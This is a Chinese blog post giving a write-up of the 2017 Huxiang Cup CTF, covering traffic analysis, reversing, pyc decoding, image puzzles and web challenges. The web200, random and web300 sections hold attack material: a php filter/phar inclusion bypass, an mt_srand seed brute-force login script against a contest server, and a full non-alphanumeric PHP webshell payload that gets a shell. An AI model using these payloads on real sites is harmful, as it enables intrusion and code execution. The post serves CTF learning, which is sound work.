<!doctype html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    
    <title>2017湖湘杯writeup | 1ABlades&#39; blog</title>
    
    <link rel="alternative" href="/atom.xml" title="1ABlades&#39; blog" type="application/atom+xml">
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="/libs/fancybox/jquery.fancybox.css" charset="utf-8">
    
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body class="site">
    <header class="site-header">
        <h1 class="site-title"><a href="/">1ABlades&#39; blog</a></h1>
        <nav class="site-nav">
            <ul class="nav">
                
                <li><a href="/archives">Archives</a></li>
                
                
                <li><a href="/atom.xml" title="RSS Feed">rss</a></li>
                
                <li><a class="toggle-search" href="#search">search</a></li>
            </ul>
        </nav>
        <div class="site-search" id="search">
            <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="1ablades.github.io"></form>
        </div>
        
            <div class="site-header-background" style="background-image:url(http://reumia.github.io/hexo-theme-zzoman2015/images/background-zzoman2015.jpg)"></div>
        
    </header>
    <div class="site-body">
        <div class="global-width">
    <article class="article" data-layout="post" data-slug="2017湖湘杯writeup">
        <div class="article-content">
            
            
            <header class="article-header">
                <div class="article-meta">
                    <a href="/2017/12/03/2017湖湘杯writeup/" class="article-date">
  <time datetime="2017-12-02T18:09:43.000Z">2017-12-03</time>
</a>
                    
                    
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>

                </div>
                
    <h1 class="article-title" itemprop="name">
      <a href="/2017/12/03/2017湖湘杯writeup/">2017湖湘杯writeup</a>
    </h1>

            </header>
            
            <div class="article-body">
                <p>部分题解</p>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>导出http 发现有个flag.zip<br>解压后文件内容是rgb的像素点<br>脚本：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="built_in">from</span> PIL import Image</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="keyword">a</span>=<span class="number">98457</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, <span class="keyword">a</span>+<span class="number">1</span>):</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">a</span> % k == <span class="number">0</span>) <span class="keyword">and</span> (k &lt; <span class="keyword">a</span>):</div><div class="line">        x = k</div><div class="line">        y = int(<span class="keyword">a</span><span class="comment"> // k)</span></div><div class="line">        print x,y</div><div class="line">        im = Image.<span class="built_in">new</span>(<span class="string">"RGB"</span>,(x,y))</div><div class="line">        <span class="built_in">file</span> = <span class="built_in">open</span>(<span class="string">'ce.txt'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</div><div class="line">                <span class="built_in">line</span> = <span class="built_in">file</span>.readline()<span class="comment">#</span></div><div class="line">                rgb = <span class="built_in">line</span>.<span class="built_in">split</span>(<span class="string">","</span>)</div><div class="line">                im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</div><div class="line">        im.show()</div></pre></td></tr></table></figure></p>
<h3 id="Re4newer"><a href="#Re4newer" class="headerlink" title="Re4newer"></a>Re4newer</h3><p>ida打开<br>定位到判断函数<br><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/07IK0Lkhe0.png" alt="mark"></p>
<p>flag 是v4和0x22的异或  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/iLLflhhIIb.png" alt="mark"></p>
<p>然后web狗手撕的 :)</p>
<h3 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h3><p>当时没做出来，因为没有去调试。。<br>拖到jeb里看一下有一个加密，一个解密文件，解密文件没东西，看了下加密，就是普通的和密码进行异或。所以就是要找到password，并没有找到。<br>我们进行调试，在加密一下就可以得到原文了，而且发现此时密码已经记住，然后把加密文件扔进去，就可以得到flag图片了</p>
<h3 id="pyc分析"><a href="#pyc分析" class="headerlink" title="pyc分析"></a>pyc分析</h3><p>2015xdctf原题<br><code>uncompyle6 revPyc.pyc</code></p>
<p>反编译出源码</p>
<p>查看globals()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</div><div class="line">  <span class="keyword">File</span> <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;<span class="keyword">module</span>&gt;</div><div class="line">  <span class="keyword">File</span> <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;lambda&gt;</div><div class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> <span class="keyword">directory</span>: <span class="string">'flag.txt'</span></div><div class="line">&gt;&gt;&gt; globals()</div><div class="line">&#123;<span class="string">'string'</span>: &lt;<span class="keyword">module</span> <span class="string">'string'</span> <span class="keyword">from</span> <span class="string">'D:\Python27\lib\string.pyc'</span>&gt;, <span class="string">'__builtins__'</span>: &lt;<span class="keyword">module</span> <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__package__'</span>: <span class="keyword">None</span>, <span class="string">'i'</span>: <span class="number">654</span>, <span class="string">'table'</span>: <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span>, <span class="string">'encode'</span>: &lt;<span class="keyword">function</span> <span class="keyword">encode</span> <span class="keyword">at</span> <span class="number">0x02836C30</span>&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'getbit'</span>: &lt;<span class="keyword">function</span> getbit <span class="keyword">at</span> <span class="number">0x028364B0</span>&gt;, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'setbit'</span>: &lt;<span class="keyword">function</span> setbit <span class="keyword">at</span> <span class="number">0x02815E30</span>&gt;&#125;</div></pre></td></tr></table></figure>
<p>整理完代码</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[<span class="name">data</span>[<span class="symbol">'i</span>'] = ((<span class="name">table.index</span>(<span class="name">data</span>[<span class="symbol">'i</span>']) + <span class="number">1</span>))</div><div class="line">__this() for __l[<span class="symbol">'buf</span>'] in [(</div><div class="line">             j=(<span class="name">i</span> / <span class="number">6</span>) * <span class="number">8</span> + (<span class="name">i</span> % <span class="number">6</span>)</div><div class="line">             setbit(<span class="name">buf</span>, i, getbit(<span class="name">data</span>, j))</div><div class="line"></div><div class="line">              if __i is not __sentinel else __after())(<span class="name">next</span>(<span class="name">__items</span>, __sentinel)))())</div><div class="line"></div><div class="line">        (<span class="name">iter</span>(<span class="name">xrange</span>((<span class="name">__l</span>[<span class="symbol">'_len</span>'] * <span class="number">6</span>)))</div><div class="line"></div><div class="line"> for __g[<span class="symbol">'table</span>'] in [(<span class="name">string.printable.strip</span>())]][<span class="name">0</span>] for __g[<span class="symbol">'string</span>'] in [(<span class="name">__import__</span>(<span class="symbol">'string</span>', __g, __g))]][<span class="name">0</span>])(<span class="name">globals</span>(), (<span class="name"><span class="builtin-name">lambda</span></span> <span class="name">f:</span> (lambda x: x(x))(<span class="name"><span class="builtin-name">lambda</span></span> <span class="name">y:</span> <span class="name">f</span>(lambda: y(y)()))))</div></pre></td></tr></table></figure>
<p>加密方式就出来了，把原字符在table的index+1后，把后6位保存到文件里,由于6<em>4==3</em>8，我就每3字节一起decode，decode3b函数</p>
<p>exp</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">python</div><div class="line"><span class="section">#Embedded file name: rev300.py</span></div><div class="line">__g = globals()</div><div class="line">__y = (lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())))</div><div class="line">string = (<span class="strong">__import__</span>('string', <span class="strong">__g, __</span>g))</div><div class="line">table = (string.printable.strip())</div><div class="line">"""</div><div class="line">setbit = (lambda p, pos, value: (lambda <span class="strong">__l: [ [ [ (lambda __</span>target, <span class="strong">__slice, __</span>value: [<span class="string"> (lambda __target, __slice, __value: [ __l['p'</span>] for <span class="strong">__target[__</span>slice] in [<span class="string">(lambda __old: (lambda __ret: (__old | __value if __ret is NotImplemented else __ret))(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice</span>])] ][<span class="string">0</span>])(<span class="strong">__l['p'], __</span>l[<span class="string">'cpos'</span>], <span class="strong">__l['value'] &lt;&lt; __</span>l[<span class="string">'bpos'</span>]) for <span class="strong">__target[__</span>slice] in [<span class="string">(lambda __old: (lambda __ret: (__old &amp; __value if __ret is NotImplemented else __ret))(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice</span>])] ][<span class="string">0</span>])(<span class="strong">__l['p'], __</span>l[<span class="string">'cpos'</span>], ~(1 <span class="xml"><span class="tag">&lt;&lt; <span class="attr">__l</span>['<span class="attr">bpos</span>'])) <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">bpos</span>'] <span class="attr">in</span> [<span class="attr">__l</span>['<span class="attr">pos</span>'] % <span class="attr">8</span>] ][<span class="attr">0</span>] <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">cpos</span>'] <span class="attr">in</span> [<span class="attr">__l</span>['<span class="attr">pos</span>'] / <span class="attr">8</span>] ][<span class="attr">0</span>] <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">p</span>'], <span class="attr">__l</span>['<span class="attr">pos</span>'], <span class="attr">__l</span>['<span class="attr">value</span>'] <span class="attr">in</span> [(<span class="attr">p</span>, <span class="attr">pos</span>, <span class="attr">value</span>)] ][<span class="attr">0</span>])(&#123;&#125;))</span></span></div><div class="line"><span class="xml">setbit.__name__ = 'setbit'</span></div><div class="line"><span class="xml">getbit = (lambda p, pos: (lambda __l: [ [ [ __l['p'][__l['cpos']] &gt;</span>&gt; <span class="strong">__l['bpos'] &amp; 1 for __</span>l[<span class="string">'bpos'</span>] in [<span class="string">__l['pos'</span>] % 8] ][<span class="string">0</span>] for <span class="strong">__l['cpos'] in [__</span>l[<span class="string">'pos'</span>] / 8] ][<span class="string">0</span>] for <span class="strong">__l['p'], __</span>l[<span class="string">'pos'</span>] in [<span class="string">(p, pos)</span>] ][0])(&#123;&#125;))</div><div class="line">getbit.<span class="strong">__name__</span> = 'getbit'</div><div class="line">encode =  (lambda data, buf: (lambda <span class="strong">__l: [ [ (lambda __</span>items, <span class="strong">__after, __</span>sentinel: <span class="strong">__y(lambda __</span>this: lambda : (lambda <span class="strong">__i: ([ [ __</span>this() for <span class="strong">__l['data'][__</span>l[<span class="string">'i'</span>]] in [<span class="string">table.index(__l['data'</span>][<span class="symbol">__l['i'</span>]]) + 1] ][<span class="string">0</span>] for <span class="strong">__l['i'] in [__</span>i] ][<span class="string">0</span>] if <span class="strong">__i is not __</span>sentinel else <span class="strong">__after()))(next(__</span>items, <span class="strong">__sentinel)))())(iter(xrange(__</span>l[<span class="string">'_len'</span>])), lambda : (lambda <span class="strong">__items, __</span>after, <span class="strong">__sentinel: __</span>y(lambda <span class="strong">__this: lambda : (lambda __</span>i: ([<span class="string"> [ [ __this() for __l['buf'</span>] in [<span class="string">setbit(__l['buf'</span>], <span class="strong">__l['i'], getbit(__</span>l[<span class="string">'data'</span>], <span class="strong">__l['j']))] ][0] for __</span>l[<span class="string">'j'</span>] in [<span class="string">__l['i'</span>] / 6 <span class="bullet">* 8 + __l['i'] % 6] ][0] for __l['i'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l['_len'] *</span> 6)), lambda : <span class="strong">__l['buf'], []), []) for __</span>l[<span class="string">'_len'</span>] in [<span class="string">len(__l['data'</span>])] ][<span class="string">0</span>] for <span class="strong">__l['data'], __</span>l[<span class="string">'buf'</span>] in [<span class="string">(data, buf)</span>] ][0])(&#123;&#125;))</div><div class="line">encode.<span class="strong">__name__</span> = 'encode'</div><div class="line">"""</div><div class="line">def setbit(p,pos,value):</div><div class="line"><span class="code">    bpos = pos % 8</span></div><div class="line"><span class="code">    cpos = pos / 8</span></div><div class="line"><span class="code">    s = p</span></div><div class="line"><span class="code">    s[cpos] = p[cpos] &amp; (~(1 &lt;&lt; bpos))</span></div><div class="line"><span class="code">    s[cpos] = p[cpos] | (value &lt;&lt; bpos)</span></div><div class="line"><span class="code">    return s</span></div><div class="line">def getbit(p,pos):</div><div class="line"><span class="code">    bpos = pos % 8</span></div><div class="line"><span class="code">    cpos = pos / 8</span></div><div class="line"><span class="code">    return p[cpos] &gt;&gt; bpos &amp; 1</span></div><div class="line">def encode(data, buf):</div><div class="line"><span class="code">    indexdata = []</span></div><div class="line"><span class="code">    for i in xrange(len(data)):</span></div><div class="line"><span class="code">        indexdata.append(table.index(data[i]) + 1)</span></div><div class="line"><span class="code">    res = buf</span></div><div class="line"><span class="code">    for i in xrange(len(data)*6):</span></div><div class="line"><span class="code">        j = i / 6 * 8 + i % 6</span></div><div class="line"><span class="code">        setbit(res, i, getbit(indexdata, j))</span></div><div class="line"><span class="code">    return res</span></div><div class="line">def encrypt():</div><div class="line"><span class="code">    fin = open('key.txt', 'r')</span></div><div class="line"><span class="code">    s = fin.read().strip()</span></div><div class="line"><span class="code">    fin.close()</span></div><div class="line"><span class="code">    ss = ([])</span></div><div class="line"><span class="code">    sss = ([])</span></div><div class="line"><span class="code">    __items = iter(s)</span></div><div class="line"><span class="code">    __after = (lambda : [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ (lambda __value: [ __this() for __g['sssss'] in [(lambda __ret: (__g['sssss'] + __value if __ret is NotImplemented else __ret))(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value))] ][0])(chr(c)) for __g['c'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(ssss), lambda : [ (fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [open('key1.enc', 'wb+')] ][0], []) for __g['sssss'] in [''] ][0] for __g['ssss'] in [encode(ss, sss)] ][0])</span></div><div class="line"><span class="code">    __sentinel = ([])</span></div><div class="line"><span class="code">    __y(lambda __this: lambda : (lambda __i: ([ (ss.append(c), (sss.append(0), __this())[1])[1] for __g['c'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))()</span></div><div class="line">def decrypt():</div><div class="line"><span class="code">    fin = open('key.enc','rb')</span></div><div class="line"><span class="code">    cipher = fin.read()</span></div><div class="line"><span class="code">    plain = ''</span></div><div class="line"><span class="code">    def decode3b(s):</span></div><div class="line"><span class="code">        a = s &gt;&gt; 16</span></div><div class="line"><span class="code">        b = (s &gt;&gt; 8) &amp; 0xFF</span></div><div class="line"><span class="code">        c = s &amp; 0xff</span></div><div class="line"><span class="code">        sa = bin(a)[2:].zfill(8)</span></div><div class="line"><span class="code">        sb = bin(b)[2:].zfill(8)</span></div><div class="line"><span class="code">        sc = bin(c)[2:].zfill(8)</span></div><div class="line"><span class="code">        return table[int(sa[2:], 2)] + table[int(sb[4:] + sa[:2], 2)] + table[int(sc[6:] + sb[:4], 2)] + table[int(sc[:6], 2)]</span></div><div class="line"><span class="code">    for i in xrange(0,len(cipher),3):</span></div><div class="line"><span class="code">        s = int(cipher[i:i+3].encode('hex'),16)</span></div><div class="line"><span class="code">        plain += decode3b(s)</span></div><div class="line"><span class="code">    print plain</span></div><div class="line"><span class="code">    return ''.join(table[(table.index(c) + 63) % 64] for c in plain)</span></div><div class="line">if <span class="strong">__name__</span> == '<span class="strong">__main__</span>':</div><div class="line"></div><div class="line"><span class="code">    print decrypt()</span></div><div class="line"><span class="code">    print table[table.index("d")+64]</span></div><div class="line"><span class="code">    #Key:9733c070b2138e5f</span></div></pre></td></tr></table></figure>
<p>由于只保留了最后6位，所以在table里的index大于64的特殊字符是没有的，key后面的d其实是:</p>
<h3 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h3><p>根据<a href="http://118.190.87.135:10080/?op=home" target="_blank" rel="external">http://118.190.87.135:10080/?op=home</a><br>尝试文件包含 ../ 关键字被禁<br>使用php filter 读取文件<br>common.php 发现自动添加.png后缀  </p>
<p> <img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/bkkCm7CJ0f.png" alt="mark"></p>
<p>可以使用phar协议绕过</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/4faB3ai3kI.png" alt="mark"></p>
<p>但是php 命令执行相关函数被禁 可以使用php函数读取</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/b9lclgC8H8.png" alt="mark"></p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/GgBh1FkGEb.png" alt="mark"></p>
<h3 id="简单的安卓"><a href="#简单的安卓" class="headerlink" title="简单的安卓"></a>简单的安卓</h3><p>jeb载入 即可  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/9I19aC5CIE.png" alt="mark"></p>
<h3 id="热身运动"><a href="#热身运动" class="headerlink" title="热身运动"></a>热身运动</h3><p>gif 一帧帧的看</p>
<p>发现坐标可以和base64 一一对应 最后=补全即可</p>
<p>ZmxhZ3sxdF8xNV9mdW5ueX0=</p>
<p>flag{1t_15_funny}</p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>.index.php.swp<br>发现源码泄露</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/cF2L1Dh0dc.png" alt="mark"></p>
<p>简单的mt_srand随机数爆破 session置空的绕过</p>
<p>脚本如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length = <span class="number">10</span>)</span></span>&#123; $randpwd = <span class="string">""</span>; <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)&#123; $randpwd .= chr(mt_rand(<span class="number">100</span>, <span class="number">200</span>)); &#125; <span class="keyword">return</span> $randpwd; &#125; $t = time()<span class="number">-20</span>; <span class="keyword">for</span>($i = $t; $i &lt; $t + <span class="number">40</span>; $i++)&#123; mt_srand($i); $pwd=create_password(); $curl = file_get_contents(<span class="string">"http://114.215.138.89:10080/index.php?pwd=$pwd&amp;login="</span>); <span class="keyword">echo</span> $curl.<span class="string">'&lt;br&gt;'</span>; &#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h3><p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/GjGcHa903a.png" alt="mark"></p>
<p>阅读源码 构造不含上述字符的shell即可</p>
<p>根据p牛博客<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？<br>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br>再取这个字符串的第一个字母，就可以获得’A’了<br>payload:<br><code>http://127.0.0.1:8000/web300.php?content=$_=[].&#39;&#39;;$_=$_[&#39;]&#39;==&#39;[&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></p>
<p>url 编码一下 提交<br>getshell<br>cat flag.php  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/cAH0IkgdfI.png" alt="mark"></p>
<h3 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h3><p>脚本：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line">from PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">with <span class="built_in">open</span>(<span class="string">'pixels.jpg.pkl'</span>) as f:</div><div class="line">       data= pickle.loads(f.read().encode(<span class="string">'utf8'</span>))</div><div class="line"></div><div class="line">white_pixels = [(<span class="built_in">int</span>(e[<span class="number">0</span>]), <span class="built_in">int</span>(e[<span class="number">1</span>])) <span class="keyword">for</span> e in data[<span class="number">1</span>:]]</div><div class="line"><span class="built_in">width</span> = <span class="built_in">max</span>([p[<span class="number">0</span>] <span class="keyword">for</span> p in white_pixels]) + <span class="number">10</span></div><div class="line"><span class="built_in">height</span> = <span class="built_in">max</span>([p[<span class="number">1</span>] <span class="keyword">for</span> p in white_pixels])+ <span class="number">10</span></div><div class="line"></div><div class="line"><span class="built_in">image</span> = Image.<span class="keyword">new</span>(<span class="string">'1'</span>, (<span class="built_in">width</span>, <span class="built_in">height</span>), <span class="number">0</span>)</div><div class="line"><span class="built_in">pixels</span> = <span class="built_in">image</span>.load()</div><div class="line"></div><div class="line"><span class="keyword">for</span> pixel in white_pixels:</div><div class="line">       <span class="built_in">pixels</span>[pixel[<span class="number">0</span>],pixel[<span class="number">1</span>]] = <span class="number">255</span></div><div class="line"></div><div class="line"><span class="built_in">image</span>.show()</div></pre></td></tr></table></figure></p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/j30JE5mF8e.png" alt="mark"></p>
<p>漫画图作者为billwatterson，就是flag</p>
<h3 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h3><p>这个题好像没人做出来。。。<br>赛后听人说是先用ssrf 302读文件，上传文件页面需要session[‘token’]=1，然后开启debug请求user.php获取session，利用session上传文件,common.php可以自动包含文件，include参数加入赋值等于upload，会自动包含ini文件。<br>没有环境也没有复现。</p>

            </div>
        </div>
    </article>

    
    
<nav class="article-nav">
  
    <a href="/2017/12/03/ctf中的RSA总结/" id="article-nav-newer" class="article-nav-link-wrap prev">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          ctf中的RSA总结
        
      </div>
    </a>
  
  
    <a href="/2017/11/07/2017山东大学生网络安全技能大赛决赛writeup/" id="article-nav-older" class="article-nav-link-wrap next">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2017山东大学生网络安全技能大赛决赛writeup.md</div>
    </a>
  
</nav>

    

    
</div>
    </div>
    <footer class="site-footer">
        <div class="global-width">
            <ul class="site-widget">
                
                <li class="widget widget-tag">
                    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget-body">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无线安全/">无线安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

                </li>
                
                <li class="widget widget-category">
                    
                </li>
                
                <li class="widget widget-recent_posts">
                    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget-body">
      <ul>
        
          <li>
            <a href="/2019/04/02/无线安全初探/">无线安全初探</a>
          </li>
        
          <li>
            <a href="/2017/12/17/Web安全之SQL注入/">Web安全之SQL注入初探</a>
          </li>
        
          <li>
            <a href="/2017/12/03/ctf中的RSA总结/">ctf中的RSA总结</a>
          </li>
        
          <li>
            <a href="/2017/12/03/2017湖湘杯writeup/">2017湖湘杯writeup</a>
          </li>
        
          <li>
            <a href="/2017/11/07/2017山东大学生网络安全技能大赛决赛writeup/">2017山东大学生网络安全技能大赛决赛writeup.md</a>
          </li>
        
      </ul>
    </div>
  </div>

                </li>
                
            </ul>
        </div>
        <div class="site-info">
            <address>
                &copy; 2014 <a href="1ablades.github.io">1ABlades&#39; blog</a> All Right Reserved. <br/>
                Powered by <a href="http://hexo.io">Hexo</a>. Theme by <a href="http://zzoman.com">ZZOMAN</a>
            </address>
        </div>
    </footer>
    
    <script src="/libs/jquery-1.11.3.min.js" type="text/javascript"></script>
    
    <script src="/libs/fancybox/jquery.fancybox.js" type="text/javascript"></script>
    
    <script src="/js/site_init.js" type="text/javascript"></script>
    
</body>
</html>
